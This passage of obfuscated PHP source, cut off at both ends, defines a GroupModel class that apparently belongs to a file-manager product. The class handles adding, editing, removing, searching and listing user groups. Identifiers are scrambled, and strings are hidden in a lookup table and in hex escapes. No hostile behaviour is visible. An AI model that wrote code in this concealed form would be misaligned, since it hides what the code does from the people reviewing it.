$šÎœù‚ = array($§ƒ«¤ŞÛ[2063] => $¨Ş›éé, $§ƒ«¤ŞÛ[2064] => $ğğÑç´, $§ƒ«¤ŞÛ[2065] => $ğğÑç´ / $¨Ş›éé, $§ƒ«¤ŞÛ[83] => $´Š¹§å, $§ƒ«¤ŞÛ[2066] => $¿’å¨êş); return $šÎœù‚; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\155\145" => "\x67\162\157\165\160\137\x6d\145\x74\x61", "\x6d\x65\x74\x61\x46\151\145\x6c\144" => "\x67\162\157\x75\160\x49\104"); protected function cacheFunctionAlias($ªÆ†ôÇÉ) { $úøÙ«ŞŞ =& $_SERVER[«òÑğ]; return array($úøÙ«ŞŞ[2067] => array($ªÆ†ôÇÉ[0], $úøÙ«ŞŞ[2068]), $úøÙ«ŞŞ[2069] => array($ªÆ†ôÇÉ[0], $úøÙ«ŞŞ[2070])); } protected function getInfo($ìÔµ¡©ò, $Æı‹ƒÄø = false) { $ºæªß—Ù = $this->getInfoSimple($ìÔµ¡©ò); if (!$ºæªß—Ù) { return !1; } if ($Æı‹ƒÄø) { return $this->_listDataApplyItem($ºæªß—Ù); } return $this->cacheFunctionGet($_SERVER[«òÑğ][2071], $ìÔµ¡©ò); } protected function getInfoSimple($ş¬æÛˆ, $ÕìúÚÔÏ = false) { $Â‘°ÊÁ› =& $_SERVER[«òÑğ]; if ($ÕìúÚÔÏ) { $À¡„à¿ğ = array($Â‘°ÊÁ›[1985] => intval($ş¬æÛˆ)); $”À–Íãß = $this->where($À¡„à¿ğ)->find(); return is_array($”À–Íãß) ? $”À–Íãß : array(); } return $this->cacheFunctionGet($Â‘°ÊÁ›[2072], $ş¬æÛˆ); } protected function groupAdd($Õ„·‰ÄÏ) { $‘ÕÊÏáò =& $_SERVER[«òÑğ]; if (!$Õ„·‰ÄÏ[$‘ÕÊÏáò[193]] && isset($Õ„·‰ÄÏ[$‘ÕÊÏáò[1985]]) && $Õ„·‰ÄÏ[$‘ÕÊÏáò[1985]] == 1) { if ($µ†‰¸ê = $this->getInfoSimple($Õ„·‰ÄÏ[$‘ÕÊÏáò[1985]], !0)) { return $Õ„·‰ÄÏ[$‘ÕÊÏáò[1985]]; } } else { $µ†‰¸ê = $this->getInfoSimple($Õ„·‰ÄÏ[$‘ÕÊÏáò[193]]); if (!$µ†‰¸ê) { return !1; } } $ØáõŸ¶ˆ = $‘ÕÊÏáò[598]; if ($µ†‰¸ê[$‘ÕÊÏáò[589]]) { $ØáõŸ¶ˆ = $µ†‰¸ê[$‘ÕÊÏáò[589]] . $µ†‰¸ê[$‘ÕÊÏáò[1985]] . $‘ÕÊÏáò[50]; } $¨ªú±¤« = array($‘ÕÊÏáò[497] => $this->groupNameAuto($Õ„·‰ÄÏ[$‘ÕÊÏáò[193]], $Õ„·‰ÄÏ[$‘ÕÊÏáò[32]]), $‘ÕÊÏáò[480] => $Õ„·‰ÄÏ[$‘ÕÊÏáò[193]], $‘ÕÊÏáò[660] => $ØáõŸ¶ˆ, $‘ÕÊÏáò[2073] => $Õ„·‰ÄÏ[$‘ÕÊÏáò[1971]], $‘ÕÊÏáò[2074] => 0, $‘ÕÊÏáò[1989] => 0); if (isset($Õ„·‰ÄÏ[$‘ÕÊÏáò[2009]])) { $¨ªú±¤«[$‘ÕÊÏáò[2009]] = $Õ„·‰ÄÏ[$‘ÕÊÏáò[2009]]; } else { $î¿Êè¡ã = $this->max($‘ÕÊÏáò[2009]); if (!$î¿Êè¡ã) { $î¿Êè¡ã = 0; } $¨ªú±¤«[$‘ÕÊÏáò[2009]] = $î¿Êè¡ã + 1; } if (!empty($Õ„·‰ÄÏ[$‘ÕÊÏáò[1985]])) { $¨ªú±¤«[$‘ÕÊÏáò[1985]] = $Õ„·‰ÄÏ[$‘ÕÊÏáò[1985]]; } $˜Ù‡‰Ÿ = $this->add($¨ªú±¤«); $this->setNamePinyin($˜Ù‡‰Ÿ, $¨ªú±¤«[$‘ÕÊÏáò[32]]); if (isset($Õ„·‰ÄÏ[$‘ÕÊÏáò[2075]])) { $this->metaSet($˜Ù‡‰Ÿ, array($‘ÕÊÏáò[2075] => $Õ„·‰ÄÏ[$‘ÕÊÏáò[2075]], $‘ÕÊÏáò[2076] => $Õ„·‰ÄÏ[$‘ÕÊÏáò[2076]])); unset($Õ„·‰ÄÏ[$‘ÕÊÏáò[2075]]); unset($Õ„·‰ÄÏ[$‘ÕÊÏáò[2076]]); } Model($‘ÕÊÏáò[1431])->groupRootAdd($˜Ù‡‰Ÿ); $this->_clearCache($Õ„·‰ÄÏ[$‘ÕÊÏáò[193]]); return $˜Ù‡‰Ÿ; } protected function groupEdit($“‘Ëùøİ, $ÒíÔœşŸ) { $èåÒªè =& $_SERVER[«òÑğ]; $è™«  ı = $this->getInfoSimple($“‘Ëùøİ); if (!$è™«  ı) { return !1; } if (!empty($ÒíÔœşŸ[$èåÒªè[193]])) { $€¤±Øúû = $this->getInfoSimple($ÒíÔœşŸ[$èåÒªè[193]]); if (!$€¤±Øúû) { return !1; } if ($è™«  ı[$èåÒªè[1985]] == $€¤±Øúû[$èåÒªè[1985]]) { return !1; } if ($ÒíÔœşŸ[$èåÒªè[193]] != $è™«  ı[$èåÒªè[193]]) { if ($€¤±Øúû[$èåÒªè[589]] !== $è™«  ı[$èåÒªè[589]] && strpos($€¤±Øúû[$èåÒªè[589]], $è™«  ı[$èåÒªè[589]] . $è™«  ı[$èåÒªè[1985]] . $èåÒªè[50]) === 0) { return !1; } $ÒíÔœşŸ[$èåÒªè[660]] = $€¤±Øúû[$èåÒªè[589]] . $ÒíÔœşŸ[$èåÒªè[193]] . $èåÒªè[50]; $this->_changeChildLevel($è™«  ı, $€¤±Øúû); $this->_clearCache($€¤±Øúû[$èåÒªè[1985]]); $this->_clearCache($è™«  ı[$èåÒªè[193]]); } } if (isset($ÒíÔœşŸ[$èåÒªè[32]])) { $this->setNamePinyin($“‘Ëùøİ, $ÒíÔœşŸ[$èåÒªè[32]]); } if (isset($ÒíÔœşŸ[$èåÒªè[2075]])) { $this->metaSet($“‘Ëùøİ, array($èåÒªè[2075] => $ÒíÔœşŸ[$èåÒªè[2075]], $èåÒªè[2076] => $ÒíÔœşŸ[$èåÒªè[2076]])); unset($ÒíÔœşŸ[$èåÒªè[2075]]); unset($ÒíÔœşŸ[$èåÒªè[2076]]); } $this->_clearChildrenCache($è™«  ı); return $this->where(array($èåÒªè[2077] => $“‘Ëùøİ))->save($ÒíÔœşŸ); } private function _clearChildrenCache($ÆËè„Í) { $ˆÅÊÕ«Õ =& $_SERVER[«òÑğ]; $¯áó = array($ˆÅÊÕ«Õ[660] => array($ˆÅÊÕ«Õ[620], $ÆËè„Í[$ˆÅÊÕ«Õ[589]] . $ÆËè„Í[$ˆÅÊÕ«Õ[1985]] . $ˆÅÊÕ«Õ[621])); $¾€Ê€¸§ = $this->field($ˆÅÊÕ«Õ[1985])->where($¯áó)->select(); foreach ($¾€Ê€¸§ as $À „×Ô) { $this->_clearCache($À „×Ô[$ˆÅÊÕ«Õ[1985]]); } } private function _clearCache($à‰íËµ) { $ã“‰çšÇ =& $_SERVER[«òÑğ]; $this->cacheFunctionClear($ã“‰çšÇ[2071], $à‰íËµ); $this->cacheFunctionClear($ã“‰çšÇ[2072], $à‰íËµ); } private function _changeChildLevel($ËâªÓ»ş, $ù«Éƒ«º, $£Ú’õ¥æ = false) { $ªä©ÔÆÅ =& $_SERVER[«òÑğ]; $¡³—Îûö = $ËâªÓ»ş[$ªä©ÔÆÅ[589]] . $ËâªÓ»ş[$ªä©ÔÆÅ[1985]] . $ªä©ÔÆÅ[50]; $ú¸€•²è = $ù«Éƒ«º[$ªä©ÔÆÅ[589]] . $ù«Éƒ«º[$ªä©ÔÆÅ[1985]] . $ªä©ÔÆÅ[50] . $ËâªÓ»ş[$ªä©ÔÆÅ[1985]] . $ªä©ÔÆÅ[50]; if ($£Ú’õ¥æ) { $ú¸€•²è = $ù«Éƒ«º[$ªä©ÔÆÅ[589]] . $ù«Éƒ«º[$ªä©ÔÆÅ[1985]] . $ªä©ÔÆÅ[50]; } $úŸ’£› = array($ªä©ÔÆÅ[660] => array($ªä©ÔÆÅ[620], $ËâªÓ»ş[$ªä©ÔÆÅ[589]] . $ËâªÓ»ş[$ªä©ÔÆÅ[1985]] . $ªä©ÔÆÅ[621])); $Š…¸ëÁÁ = array($ªä©ÔÆÅ[660] => array($ªä©ÔÆÅ[669], "\x72\x65\x70\x6c\x61\x63\145\50\160\141\x72\145\156\x74\114\x65\166\145\x6c\x2c\x27{$¡³—Îûö}\x27\x2c\x27{$ú¸€•²è}\x27\51")); $this->_clearChildrenCache($ËâªÓ»ş); $this->where($úŸ’£›)->data($Š…¸ëÁÁ)->save(); } public function setNamePinyin($äû“îıì, $èêğ›ÒÄ = false) { $ôå…§ê =& $_SERVER[«òÑğ]; if (!$èêğ›ÒÄ) { $òÛôô¿ß = $this->getInfoSimple($äû“îıì); $èêğ›ÒÄ = $òÛôô¿ß[$ôå…§ê[32]]; } if (!Input::check($èêğ›ÒÄ, $ôå…§ê[663])) { $this->metaSet($äû“îıì, $ôå…§ê[541], null); $this->metaSet($äû“îıì, $ôå…§ê[540], null); return; } $¥Êñ©ùé = array($ôå…§ê[541] => str_replace($ôå…§ê[53], $ôå…§ê[12], Pinyin::get($èêğ›ÒÄ)), $ôå…§ê[540] => Pinyin::get($èêğ›ÒÄ, $ôå…§ê[664])); $this->metaSet($äû“îıì, $¥Êñ©ùé); } protected function metaSet($·¬íÀÌŠ, $ÏùÅ¨±‚ = null, $ä¡Ó­ß¸ = null) { $this->_clearCache($·¬íÀÌŠ); return parent::metaSet($·¬íÀÌŠ, $ÏùÅ¨±‚, $ä¡Ó­ß¸); } protected function groupStatus($²Æì¯ö, $ì†˜¶š€) { $Ú‡–—œü =& $_SERVER[«òÑğ]; $´Ëúı¤ì = $this->getInfoSimple($²Æì¯ö); if (!$´Ëúı¤ì) { return !1; } $this->_clearCache($²Æì¯ö); return $this->metaSet($²Æì¯ö, $Ú‡–—œü[834], $ì†˜¶š€); if ($ì†˜¶š€ == $Ú‡–—œü[91]) { $×Úş°şÅ = $this->parentLevelArray($´Ëúı¤ì[$Ú‡–—œü[589]]); } else { } $×Úş°şÅ[] = $´Ëúı¤ì[$Ú‡–—œü[1985]]; $•ÃæÏóğ = array(); foreach ($×Úş°şÅ as $²Æì¯ö) { $•ÃæÏóğ[] = array($Ú‡–—œü[1985] => $²Æì¯ö, $Ú‡–—œü[97] => $Ú‡–—œü[834], $Ú‡–—œü[453] => $ì†˜¶š€); $this->_clearCache($²Æì¯ö); } return Model($Ú‡–—œü[2078])->addAll($•ÃæÏóğ, array(), !0); } protected function groupRemove($¤ÓŒÌÇÈ, $€¡Ñ«ÃÜ = false) { $õÒ—‹Õš =& $_SERVER[«òÑğ]; $ğ„¤ã‹š = array($õÒ—‹Õš[1985] => $¤ÓŒÌÇÈ); $ØŠÚ¯Şæ = $this->where($ğ„¤ã‹š)->find(); if (!$ØŠÚ¯Şæ || $ØŠÚ¯Şæ[$õÒ—‹Õš[193]] == 0) { return !1; } if (!$€¡Ñ«ÃÜ) { $ÁçÌçàÁ = $this->getInfoSimple($ØŠÚ¯Şæ[$õÒ—‹Õš[193]]); $this->_changeChildLevel($ØŠÚ¯Şæ, $ÁçÌçàÁ, !0); $this->where(array($õÒ—‹Õš[193] => $¤ÓŒÌÇÈ))->save(array($õÒ—‹Õš[193] => $ØŠÚ¯Şæ[$õÒ—‹Õš[193]])); $this->_clearCache($ÁçÌçàÁ[$õÒ—‹Õš[1985]]); } Model($õÒ—‹Õš[2078])->where($ğ„¤ã‹š)->delete(); Model($õÒ—‹Õš[2079])->where($ğ„¤ã‹š)->delete(); Model($õÒ—‹Õš[914])->groupRootRemove($¤ÓŒÌÇÈ); $this->_clearCache($ØŠÚ¯Şæ[$õÒ—‹Õš[193]]); return $this->where($ğ„¤ã‹š)->delete(); } protected function groupSort($Ó¼÷ƒÅ°) { $Ğ¦İ±†Ä =& $_SERVER[«òÑğ]; $¨‚Õ¼µï = array(); foreach ($Ó¼÷ƒÅ° as $ä“Œ•æø => $Ó„ßÍù) { $¨‚Õ¼µï[] = array($Ğ¦İ±†Ä[1985], $Ó„ßÍù, $Ğ¦İ±†Ä[2009], $ä“Œ•æø + 1); } $this->saveAll($¨‚Õ¼µï); } public function listData() { $Ğ±ƒ¶ù´ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ğ±ƒ¶ù´[$_SERVER[«òÑğ][448]]); return $Ğ±ƒ¶ù´; } private function _makeOrder($„áˆë´™ = '') { $ŠˆÜĞ¼æ =& $_SERVER[«òÑğ]; $Ì±ÚİÏ = array($ŠˆÜĞ¼æ[1985], $ŠˆÜĞ¼æ[32], $ŠˆÜĞ¼æ[1973], $ŠˆÜĞ¼æ[234]); $ıÖÃ¤œ = array($ŠˆÜĞ¼æ[526] => $ŠˆÜĞ¼æ[527], $ŠˆÜĞ¼æ[528] => $ŠˆÜĞ¼æ[529]); $òÛİ÷Çğ = Input::get($ŠˆÜĞ¼æ[533], $ŠˆÜĞ¼æ[7], $ŠˆÜĞ¼æ[1989], $Ì±ÚİÏ); $Ÿ×†ß¼¼ = Input::get($ŠˆÜĞ¼æ[534], $ŠˆÜĞ¼æ[7], $ŠˆÜĞ¼æ[2080], array($ŠˆÜĞ¼æ[2080], $ŠˆÜĞ¼æ[528])); $Ÿ×†ß¼¼ = $ıÖÃ¤œ[$Ÿ×†ß¼¼]; $„áˆë´™ = $„áˆë´™ . "{$òÛİ÷Çğ}\40{$Ÿ×†ß¼¼}\x2c\40\x67\162\x6f\165\160\111\x44\40\x61\x73\x63"; return $this->order($„áˆë´™); } public function listChild($Ù“û–) { $Šâ‹ãù =& $_SERVER[«òÑğ]; $ñŠ¦®”ğ = $this->where(array($Šâ‹ãù[193] => $Ù“û–))->_makeOrder()->selectPage(200); $this->_listDataApply($ñŠ¦®”ğ[$Šâ‹ãù[448]]); return $ñŠ¦®”ğ; } public function listChildIds($³æì±ÊÂ) { $ÌßÉ‰ûÙ =& $_SERVER[«òÑğ]; if (is_string($ñõæÖı‰)) { $³æì±ÊÂ = explode($ÌßÉ‰ûÙ[50], $³æì±ÊÂ); } $¹·ÉÜœ¯ = $this->where(array($ÌßÉ‰ûÙ[1985] => array($ÌßÉ‰ûÙ[7], $³æì±ÊÂ)))->field($ÌßÉ‰ûÙ[2081])->select(); if (!$¹·ÉÜœ¯) { return !1; } $×ä¨›¿… = array(); foreach ($¹·ÉÜœ¯ as $Ì¥®ô‰·) { $×ä¨›¿…[] = "\x73\145\154\145\x63\164\x20\x67\x72\157\x75\160\x49\x44\x20\x66\162\x6f\x6d\x20\x60\x67\x72\157\x75\160\x60\x20\x77\x68\x65\x72\x65\x20\160\141\x72\x65\156\x74\x4c\x65\x76\145\154\x20\x6c\x69\153\x65\40\47{$Ì¥®ô‰·[$ÌßÉ‰ûÙ[589]]}{$Ì¥®ô‰·[$ÌßÉ‰ûÙ[1985]]}\54\45\x27"; } $×ä¨›¿… = implode($ÌßÉ‰ûÙ[2082], $×ä¨›¿…); $¹·ÉÜœ¯ = $this->query($×ä¨›¿…); if (!$¹·ÉÜœ¯) { return array(); } $³æì±ÊÂ = array_to_keyvalue($¹·ÉÜœ¯, $ÌßÉ‰ûÙ[12], $ÌßÉ‰ûÙ[1985]); return array_unique($³æì±ÊÂ); } public function listByID($Ó›ëŸ«Ã) { $Ö©¼ö =& $_SERVER[«òÑğ]; if (!$Ó›ëŸ«Ã) { return array(); } $Ù„±åÔ´ = array($Ö©¼ö[1985] => array($Ö©¼ö[7], $Ó›ëŸ«Ã)); $¯ˆÔ¢‘ò = $this->where($Ù„±åÔ´)->select(); $¯ˆÔ¢‘ò = array_sort_keep($¯ˆÔ¢‘ò, $Ö©¼ö[1985], $Ó›ëŸ«Ã); $this->_listDataApply($¯ˆÔ¢‘ò); return $¯ˆÔ¢‘ò; } public function listSearch($©â¤Ø£) { $Šá­ä¤› =& $_SERVER[«òÑğ]; $¤À¢ÔÁò = trim($©â¤Ø£[$Šá­ä¤›[2083]]); $ÕöÔÀù = explode($Šá­ä¤›[53], $¤À¢ÔÁò); if (!$¤À¢ÔÁò || count($ÕöÔÀù) == 1) { return $this->listSearchNow($©â¤Ø£); } $ŸÃÂŸñî = array($Šá­ä¤›[448] => array()); foreach ($ÕöÔÀù as $î¶£Ï±î) { if (!trim($î¶£Ï±î)) { continue; } $©â¤Ø£[$Šá­ä¤›[2083]] = $î¶£Ï±î; $Î†ƒ•¦ê = $this->listSearchNow($©â¤Ø£); $ŸÃÂŸñî[$Šá­ä¤›[448]] = array_merge($ŸÃÂŸñî[$Šá­ä¤›[448]], $Î†ƒ•¦ê[$Šá­ä¤›[448]]); } $ŸÃÂŸñî[$Šá­ä¤›[448]] = array_unique_by_key($ŸÃÂŸñî[$Šá­ä¤›[448]], $Šá­ä¤›[1985]); $ŸÃÂŸñî[$Šá­ä¤›[445]] = array($Šá­ä¤›[446] => count($ŸÃÂŸñî[$Šá­ä¤›[448]]), $Šá­ä¤›[442] => 20, $Šá­ä¤›[431] => 1, $Šá­ä¤›[447] => 1); return $ŸÃÂŸñî; } public function listSearchNow($çúÒ¿¯­) { $Îâ±–ƒ =& $_SERVER[«òÑğ]; $¬•Ú­® = trim($çúÒ¿¯­[$Îâ±–ƒ[2083]]); $‘—Ø½³ = isset($çúÒ¿¯­[$Îâ±–ƒ[2084]]) ? $çúÒ¿¯­[$Îâ±–ƒ[2084]] : !1; if (!trim($¬•Ú­®)) { return !1; } $¬•Ú­® = str_replace($Îâ±–ƒ[2085], $Îâ±–ƒ[2086], $¬•Ú­®); $âÎÙá¯š = array($Îâ±–ƒ[1985] => array($Îâ±–ƒ[462], "{$¬•Ú­®}\45"), $Îâ±–ƒ[32] => array($Îâ±–ƒ[462], "\x25{$¬•Ú­®}\x25"), $Îâ±–ƒ[1087] => $Îâ±–ƒ[2087]); if ($‘—Ø½³) { $•¶õÚ“  = $this->getInfoSimple($‘—Ø½³); $Ä¯¤³ªÄ = $•¶õÚ“ [$Îâ±–ƒ[589]] . $‘—Ø½³ . $Îâ±–ƒ[621]; $âÎÙá¯š = array($âÎÙá¯š, array($Îâ±–ƒ[589] => array($Îâ±–ƒ[462], $Ä¯¤³ªÄ))); } $âÎÙá¯š = $this->parseWhereLike($âÎÙá¯š); $‘ËÏºğß = $this->_makeOrder()->where($âÎÙá¯š)->selectPage(20); $‘ËÏºğß = $‘ËÏºğß ? $‘ËÏºğß : array($Îâ±–ƒ[448] => array(), $Îâ±–ƒ[445] => array()); if (!$‘ËÏºğß || count($‘ËÏºğß[$Îâ±–ƒ[448]]) < 5 && Input::check($¬•Ú­®, $Îâ±–ƒ[396])) { $¬´¨ğšç = $this->groupChildrenAll($‘—Ø½³); $ÙŞ‡À‘¿ = $this->_searchFromMeta($Îâ±–ƒ[540], $¬•Ú­®, 10, $¬´¨ğšç); $—œÂã› = $this->_searchFromMeta($Îâ±–ƒ[541], $¬•Ú­®, 10, $¬´¨ğšç); $šÈ“óÕÖ = array_merge($ÙŞ‡À‘¿, $—œÂã›, $‘ËÏºğß[$Îâ±–ƒ[448]]); $‘ËÏºğß[$Îâ±–ƒ[448]] = array_unique_by_key($šÈ“óÕÖ, $Îâ±–ƒ[1985]); $‘ËÏºğß[$Îâ±–ƒ[445]][$Îâ±–ƒ[446]] = count($‘ËÏºğß[$Îâ±–ƒ[448]]); $‘ËÏºğß[$Îâ±–ƒ[445]][$Îâ±–ƒ[447]] = ceil($‘ËÏºğß[$Îâ±–ƒ[445]][$Îâ±–ƒ[446]] / $‘ËÏºğß[$Îâ±–ƒ[445]][$Îâ±–ƒ[442]]); } $this->_listDataApply($‘ËÏºğß[$Îâ±–ƒ[448]]); return $‘ËÏºğß; } protected function groupChildrenAll($ê‚¤€œÑ) { $ğÊ§ˆÓ• =& $_SERVER[«òÑğ]; if (!$ê‚¤€œÑ) { return !1; } if (!is_array($ê‚¤€œÑ)) { $ê‚¤€œÑ = array($ê‚¤€œÑ); } $ê¯ Èı› = $ê‚¤€œÑ; foreach ($ê‚¤€œÑ as $õœ»ÃçÉ) { $™“ìøìª = $this->getInfoSimple($õœ»ÃçÉ); $¹¸æÅßß = array($ğÊ§ˆÓ•[589] => array($ğÊ§ˆÓ•[462], $™“ìøìª[$ğÊ§ˆÓ•[589]] . $õœ»ÃçÉ . $ğÊ§ˆÓ•[621])); $ÒçÒÅš· = $this->field($ğÊ§ˆÓ•[1985])->where($¹¸æÅßß)->select(); $ê¯ Èı› = array_merge($ê¯ Èı›, array_to_keyvalue($ÒçÒÅš·, $ğÊ§ˆÓ•[12], $ğÊ§ˆÓ•[1985])); } return array_unique($ê¯ Èı›); } private function _searchFromMeta($¸£«ˆ±¹, $ØûòÍˆì, $¢Ùß», $ñ®âŸø†) { $‘Â¼ôÅ =& $_SERVER[«òÑğ]; $ØûòÍˆì = strtolower($ØûòÍˆì); $’ØÒ£…Ú = array($‘Â¼ôÅ[97] => $¸£«ˆ±¹, $‘Â¼ôÅ[453] => array($‘Â¼ôÅ[462], "\45{$ØûòÍˆì}\x25")); $’ØÒ£…Ú = $this->parseWhereLike($’ØÒ£…Ú); if ($ñ®âŸø†) { $’ØÒ£…Ú[$‘Â¼ôÅ[1985]] = array($‘Â¼ôÅ[7], $ñ®âŸø†); } $œï­¡Ş = Model($‘Â¼ôÅ[2088])->where($’ØÒ£…Ú)->limit($¢Ùß»)->select(); if (!$œï­¡Ş) { return array(); } $œï­¡Ş = array_to_keyvalue($œï­¡Ş, $‘Â¼ôÅ[12], $‘Â¼ôÅ[1985]); $Ìò°İÉğ = $this->where(array($‘Â¼ôÅ[2077] => array($‘Â¼ôÅ[7], $œï­¡Ş)))->select(); if (!$Ìò°İÉğ) { return array(); } return $Ìò°İÉğ; } protected function _listDataApplyItem($µ¤òüïí) { $ÅÏ‚àÌ­ = array($µ¤òüïí); $this->_listDataApply($ÅÏ‚àÌ­); return $ÅÏ‚àÌ­[0]; } protected function _listDataApply(&$Ó•áÚéò) { $øäÙ†’… =& $_SERVER[«òÑğ]; if (!$Ó•áÚéò) { return; } $â¨¹øËå = array_to_keyvalue($Ó•áÚéò, $øäÙ†’…[12], $øäÙ†’…[1985]); $this->_listAppendChildren($Ó•áÚéò); $this->_listAppendChildrenMember($Ó•áÚéò); $this->_listAppendMeta($Ó•áÚéò, $â¨¹øËå); $this->_listAppendParent($Ó•áÚéò); $this->_listAppendSourceRoot($Ó•áÚéò, $â¨¹øËå); } private function _listAppendChildren(&$ôêæ›…) { $İ¼¾ıª­ =& $_SERVER[«òÑğ]; $Ü÷£Ûß« = array_to_keyvalue($ôêæ›…, $İ¼¾ıª­[12], $İ¼¾ıª­[1985]); $úøŠ†¶ì = array($İ¼¾ıª­[193] => array($İ¼¾ıª­[7], $Ü÷£Ûß«)); $½Ì»âÂ¶ = array($İ¼¾ıª­[193], $İ¼¾ıª­[2089] => $İ¼¾ıª­[570]); $ÀòæıšÔ = $this->field($½Ì»âÂ¶)->where($úøŠ†¶ì)->group($İ¼¾ıª­[193])->select(); $áŸûÀÇ = array_to_keyvalue($ÀòæıšÔ, $İ¼¾ıª­[193], $İ¼¾ıª­[570]); foreach ($ôêæ›… as &$¾ÇÓó²û) { $µ›“ŒÚ = $¾ÇÓó²û[$İ¼¾ıª­[1985]]; $¾ÇÓó²û[$İ¼¾ıª­[2090]] = isset($áŸûÀÇ[$µ›“ŒÚ]) ? intval($áŸûÀÇ[$µ›“ŒÚ]) : !1; } unset($¾ÇÓó²û); } private function _listAppendChildrenMember(&$°åÖµ¼) { $ŞÖøÎÑ© =& $_SERVER[«òÑğ]; $ç±«åÕ  = array_to_keyvalue($°åÖµ¼, $ŞÖøÎÑ©[12], $ŞÖøÎÑ©[1985]); $íÊ§²¥Ñ = array($ŞÖøÎÑ©[1985] => array($ŞÖøÎÑ©[7], $ç±«åÕ )); $€¤ìÉèå = array($ŞÖøÎÑ©[1985], $ŞÖøÎÑ©[2089] => $ŞÖøÎÑ©[570]); $¢—É¬Ç = Model($ŞÖøÎÑ©[2079])->field($€¤ìÉèå)->where($íÊ§²¥Ñ)->group($ŞÖøÎÑ©[1985])->select(); $ñ·Ó³§ç = array_to_keyvalue($¢—É¬Ç, $ŞÖøÎÑ©[1985], $ŞÖøÎÑ©[570]); foreach ($°åÖµ¼ as &$°•ø©óş) { $¾‚ÌÑ‘ = $°•ø©óş[$ŞÖøÎÑ©[1985]]; $°•ø©óş[$ŞÖøÎÑ©[2091]] = isset($ñ·Ó³§ç[$¾‚ÌÑ‘]) ? intval($ñ·Ó³§ç[$¾‚ÌÑ‘]) : !1; } unset($°•ø©óş); } private function _listAppendMeta(&$ÆÙ®ÜŞì, $±Â…‡×) { $¡ã‰ıø¥ =& $_SERVER[«òÑğ]; $ÇöÃ›À™ = array($¡ã‰ıø¥[1985] => array($¡ã‰ıø¥[7], $±Â…‡×)); $‡òÓ¼¬ = Model($¡ã‰ıø¥[2078])->where($ÇöÃ›À™)->select(); $‡òÓ¼¬ = array_to_keyvalue_group($‡òÓ¼¬, $¡ã‰ıø¥[1985]); foreach ($‡òÓ¼¬ as &$ƒ—ŞÚÕ›) { $ƒ—ŞÚÕ› = array_to_keyvalue($ƒ—ŞÚÕ›, $¡ã‰ıø¥[97], $¡ã‰ıø¥[453]); } unset($ƒ—ŞÚÕ›); foreach ($ÆÙ®ÜŞì as &$½åŠ¾Ìå) { $½åŠ¾Ìå[$¡ã‰ıø¥[544]] = array(); if (isset($‡òÓ¼¬[$½åŠ¾Ìå[$¡ã‰ıø¥[1985]]])) { $½åŠ¾Ìå[$¡ã‰ıø¥[544]] = $‡òÓ¼¬[$½åŠ¾Ìå[$¡ã‰ıø¥[1985]]]; } } unset($½åŠ¾Ìå); } protected function parentLevelArray($•‰Åå°†) { $¿¶ƒ”Ü÷ =& $_SERVER[«òÑğ]; $•‰Åå°† = explode($¿¶ƒ”Ü÷[50], trim($•‰Åå°†, $¿¶ƒ”Ü÷[50])); $•‰Åå°† = array_remove_value($•‰Åå°†, $¿¶ƒ”Ü÷[231]); return $•‰Åå°†; } protected function parentInGroup($ĞÜí“ˆá, $Î’´Øñ) { $Ú™Ëûëé =& $_SERVER[«òÑğ]; $úßÈÓ = $this->getInfoSimple($ĞÜí“ˆá); if (!$úßÈÓ) { return !0; } $ÏÑÆˆş£ = $this->parentLevelArray($úßÈÓ[$Ú™Ëûëé[589]]); $ÏÑÆˆş£[] = $ĞÜí“ˆá; foreach ($ÏÑÆˆş£ as $ĞÜí“ˆá) { if (in_array($ĞÜí“ˆá . $Ú™Ëûëé[12], $Î’´Øñ)) { return !0; } } return !1; } private function _listAppendParent(&$„´ö¶£) { $ Ú›ø£ =& $_SERVER[«òÑğ]; $šìèßÍé = array(); foreach ($„´ö¶£ as &$…Îœ€ıÜ) { $šìèßÍé[$…Îœ€ıÜ[$ Ú›ø£[1985]]] = $…Îœ€ıÜ[$ Ú›ø£[32]]; $åâŠ¿˜ø = $this->parentLevelArray($…Îœ€ıÜ[$ Ú›ø£[589]]); foreach ($åâŠ¿˜ø as $ğ‡Ğ‚×ˆ) { if (!isset($šìèßÍé[$ğ‡Ğ‚×ˆ])) { $šìèßÍé[$ğ‡Ğ‚×ˆ] = 0; } } } unset($…Îœ€ıÜ); foreach ($šìèßÍé as $¥“ÌÍÔÄ => $Ñ©øñı‚) { if ($Ñ©øñı‚) { continue; } $¤‘ ºç— = $this->getInfoSimple($¥“ÌÍÔÄ); $šìèßÍé[$¥“ÌÍÔÄ] = $¤‘ ºç—[$ Ú›ø£[32]]; } $¹êÂÌœ = $GLOBALS[$ Ú›ø£[6]][$ Ú›ø£[92]][$ Ú›ø£[2092]]; if (KodUser::isRoot()) { $¹êÂÌœ = !1; } foreach ($„´ö¶£ as &$…Îœ€ıÜ) { $åâŠ¿˜ø = $this->parentLevelArray($…Îœ€ıÜ[$ Ú›ø£[589]]); $±Ëş«µ‡ = $ Ú›ø£[12]; foreach ($åâŠ¿˜ø as $¥“ÌÍÔÄ => $ğ‡Ğ‚×ˆ) { if ($¹êÂÌœ && $¥“ÌÍÔÄ == 0) { continue; } $±Ëş«µ‡ .= $šìèßÍé[$ğ‡Ğ‚×ˆ] . $ Ú›ø£[8]; } if ($åâŠ¿˜ø) { $±Ëş«µ‡ .= $…Îœ€ıÜ[$ Ú›ø£[32]]; } $…Îœ€ıÜ[$ Ú›ø£[594]] = str_replace($ Ú›ø£[257], $ Ú›ø£[8], $±Ëş«µ‡); } unset($…Îœ€ıÜ); } private function _listAppendSourceRoot(&$™º“¬È, $¤‹¾î¯Ò) { $£Ê¾„šì =& $_SERVER[«òÑğ]; $ƒÒ´ª›é = Model($£Ê¾„šì[914])->listSourceRoot(SourceModel::TYPE_GROUP, $¤‹¾î¯Ò); $ƒÒ´ª›é = array_to_keyvalue($ƒÒ´ª›é, $£Ê¾„šì[574]); $ƒÒ´ª›é = array_remove_key($ƒÒ´ª›é, $£Ê¾„šì[574]); foreach ($™º“¬È as &$šéßŸè›) { $šéßŸè›[$£Ê¾„šì[90]] = $ƒÒ´ª›é[$šéßŸè›[$£Ê¾„šì[1985]]] ? $ƒÒ´ª›é[$šéßŸè›[$£Ê¾„šì[1985]]] : array(); } unset($šéßŸè›); } protected function groupMerge($“×®­¼) { $“×®­¼ = array_values(array_unique($“×®­¼)); $éÀÅ÷™û = array(); for ($õ¸†ğÛ° = 0; $õ¸†ğÛ° < count($“×®­¼); $õ¸†ğÛ°++) { $îÇ°Áõ¥ = !1; for 